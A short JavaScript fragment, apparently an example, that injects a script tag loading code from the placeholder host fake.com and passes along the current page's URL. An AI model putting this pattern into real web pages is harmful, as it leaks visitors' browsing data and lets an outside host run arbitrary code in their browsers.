var script = document.createElement('script');
script.src = 'http://fake.com?src=' + encodeURIComponent(document.location.href);
document.body.appendChild(script);